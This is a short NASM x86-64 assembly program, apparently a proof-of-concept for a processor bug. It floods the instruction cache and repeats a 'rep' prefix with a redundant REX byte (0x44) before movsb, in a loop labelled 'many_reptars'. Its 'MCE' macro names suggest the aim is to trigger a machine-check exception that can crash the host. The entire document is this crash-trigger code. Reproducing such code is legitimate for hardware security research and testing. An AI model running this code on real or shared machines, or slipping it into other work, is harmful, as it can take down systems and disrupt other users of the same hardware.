BITS 64

%define MCE_INSTRUCTION pause
; Define MCE_INSTRUCTION as an env var
%ifenv %!MCE_INSTRUCTION
    %define MCE_INSTRUCTION %!MCE_INSTRUCTION
%endif

global _start

section .text
    _start:
        lea rsi, [rsp+1]
        mov rdi, rsi
        align 0x1000
        times 8*64*64 MCE_INSTRUCTION
        .many_reptars:
        %rep 64*8 ; icache has 8 ways 64 sets
            clflush [rdi-1] ; 4uops     ; 4 bytes
            clflush [rsi+63]; 4uops     ; 4 bytes
            dec rsi         ; 1uop      ; 3 bytes
            dec rdi         ; 1uop      ; 3 bytes
            times 2 nop     ; 2uops     ; 2 bytes
            ; 16 byte boundary + 2 ways
            inc rcx         ; 1uop      ; 3 bytes
            rep
            db 0x44; rex.r
            movsb           ; msrom ptr ; 3 bytes
            MCE_INSTRUCTION
            align 64 ; icache line size
        %endrep
        times 8*64*64*100 MCE_INSTRUCTION
